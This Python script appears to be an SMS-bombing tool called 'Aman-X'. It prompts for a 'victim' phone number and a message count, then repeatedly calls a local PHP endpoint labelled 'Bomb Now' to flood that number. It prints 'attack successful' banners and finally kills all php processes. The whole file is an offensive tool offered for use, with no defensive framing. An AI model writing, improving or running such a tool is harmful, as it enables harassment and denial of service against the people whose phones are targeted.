import requests as req
import os




def sendMsg(Num=None, times=None):
    #os.system("nohup php -S 127.0.0.1:8880 -t server/ > log/serverRequest.log 2>&1 &")
    if (Num != None and times!=None):
        print()
        for i in range(1,times+1):
            try:
                r1 = req.get(f"http://127.0.0.1:8880/server.php?mo={Num}&submit=Bomb+Now", timeout=1)
            except Exception as e:
                os.system(f"clear; echo 'Atteck Succefully' | lolcat; figlet '{i}' | lolcat")
    else:
        print("\n\nSomething went wrong...")

numGood = None
while(numGood==None):
    number = input("Enter victem number : ")
    if (len(number)==10):
        try:
            int(number)
        except Exception as e:
            print("Please enter the valid number...")
        else:
            numGood="Good"
    else:                                                     print("Please enter the valid number...")
print(f"Number is : {number}")

if (numGood != None):
    count = None
    while(count==None):
        nofCount = input("\n\nHow many messages : ")
        try:
            nofCount = int(nofCount)
        except Exception as e:
            print("Please enter the valid number...")
        else:
            count="Good"

    if count != None:
        sendMsg(Num=number, times=nofCount)

print()
os.system("ps -efw | grep php | grep -v grep | awk '{print $2}' | xargs kill")
os.system("echo 'Thanks for using Aman-X made by Aman Programmer' | lolcat")
